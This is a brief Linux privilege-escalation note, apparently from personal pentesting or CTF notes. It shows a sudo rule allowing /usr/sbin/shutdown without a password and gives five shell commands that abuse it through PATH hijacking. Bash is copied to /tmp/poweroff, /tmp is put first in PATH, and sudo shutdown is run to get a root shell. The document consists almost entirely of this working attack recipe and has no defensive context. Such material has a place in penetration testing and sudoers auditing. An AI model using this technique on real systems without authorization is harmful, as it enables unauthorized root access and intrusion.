---
title: Strange privesc on Linux 🍄
---

- `(root) NOPASSWD: /usr/sbin/shutdown`. Do the following:

```shell
cp /bin/bash /tmp/poweroff
chmod +x /tmp/poweroff
export PATH=/tmp:$PATH
sudo /usr/sbin/shutdown
#now you are root
```
